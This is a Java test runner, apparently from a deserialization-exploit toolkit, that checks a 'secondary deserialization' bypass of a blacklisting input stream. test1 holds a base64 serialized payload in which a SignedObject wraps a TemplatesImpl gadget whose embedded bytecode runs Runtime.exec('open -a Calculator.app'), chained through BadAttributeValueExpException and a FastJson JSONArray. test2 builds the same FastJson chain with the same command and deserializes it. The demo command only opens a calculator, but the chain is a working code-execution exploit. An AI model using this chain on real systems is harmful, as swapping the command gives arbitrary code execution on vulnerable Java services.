package com.ppp.secmgr;

import com.ppp.ObjectPayload;
import com.ppp.chain.json.FastJson;
import com.ppp.enums.Save;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.ppp.utils.Serializer;
import com.ppp.utils.maker.CryptoUtils;

import java.io.ByteArrayInputStream;
import java.io.InputStream;

/**
 * @author Whoopsunix
 * <p>
 * 二次反序列化测试
 */
public class WrapRunner {
    public static void main(String[] args) throws Exception {
        test1();

    }

    public static void test1() throws Exception{
        String b64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4AA0wADHRoZWFsZ29yaXRobXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAAltCrPMX+AYIVOACAAB4cAAABHus7QAFc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAAAAAAB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAABisr+ur4AAAAxAB0BAAhSdW50aW1lRAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBABRTZXJpYWxWZXJzaW9uVUlERGVtbwEAAUoFceZp7jxtRxgBAA1Db25zdGFudFZhbHVlAQAKU291cmNlRmlsZQEADVJ1bnRpbWVELmphdmEAIQACAAQAAAABABoAFgAXAAEAGgAAAAIAGAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABsAAAACABx1cQB+AAgAAAG2yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANQUFABAAxJbm5lckNsYXNzZXMBABtMY29tL3BwcC91dGlscy9HYWRnZXRzJFBQUDsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBABljb20vcHBwL3V0aWxzL0dhZGdldHMkUFBQAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAVY29tL3BwcC91dGlscy9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALgAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABmFueVN0cnB3AQB4dXEAfgAGAAAALzAtAhUAhc1WrlPrZB4OAH+WkU5HVtrEJSECFFSmMs4oKm5JFPP/H3zLvQGA5/c5dAADRFNBc3IALmphdmF4Lm1hbmFnZW1lbnQuQmFkQXR0cmlidXRlVmFsdWVFeHBFeGNlcHRpb27U59qrYy1GQAIAAUwAA3ZhbHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AARbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AEXB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAAVzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ABEwACGZpbGVOYW1lcQB+AARMAAptZXRob2ROYW1lcQB+AAR4cAAAADJ0ABtjb20ucHBwLmNoYWluLmpzb24uRmFzdEpzb250AA1GYXN0SnNvbi5qYXZhdAAIZ2V0Q2hhaW5zcQB+ABQAAAApcQB+ABZxAH4AF3QACWdldE9iamVjdHNxAH4AFAAAABN0ABxjb20ucHBwLk9iamVjdFBheWxvYWRCdWlsZGVydAAZT2JqZWN0UGF5bG9hZEJ1aWxkZXIuamF2YXQAB2J1aWxkZXJzcQB+ABQAAABwdAAUY29tLnBwcC5DbGlTY2hlZHVsZXJ0ABFDbGlTY2hlZHVsZXIuamF2YXQAA3J1bnNxAH4AFAAAADNxAH4AIHEAfgAhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAQeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ACp4c3IAHmNvbS5hbGliYWJhLmZhc3Rqc29uLkpTT05BcnJheQAAAAAAAAABAgABTAAEbGlzdHEAfgAQeHBzcQB+ACkAAAABdwQAAAABcQB+AAV4eA==";

        byte[] bytes = CryptoUtils.base64decoder(b64);

        InputStream bis = new ByteArrayInputStream(bytes);
        BlackInputStream ois = new BlackInputStream(bis);
        ois.readObject();
    }

    public static void test2() throws Exception{
        final Class<? extends ObjectPayload> cls = FastJson.class;

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setOutput(String.valueOf(Save.Base64));
        String[] sinks = (String[]) Reflections.invokeMethod(cls.getAnnotation(Sink.class), "value", new Class[]{}, new Object[]{});
        sinksHelper.setSink(sinks[0]);

        sinksHelper.setEnchant(EnchantType.RUNTIME);
        sinksHelper.setCommand("open -a Calculator.app");

        // 生成 Gadget
        ObjectPayload<?> object = cls.newInstance();
        Object gadget = object.getObject(sinksHelper);

        byte[] bytes = Serializer.serialize(gadget);
        System.out.println(CryptoUtils.base64encoder(bytes));

        InputStream bis = new ByteArrayInputStream(bytes);
        BlackInputStream ois = new BlackInputStream(bis);
        ois.readObject();
    }
}
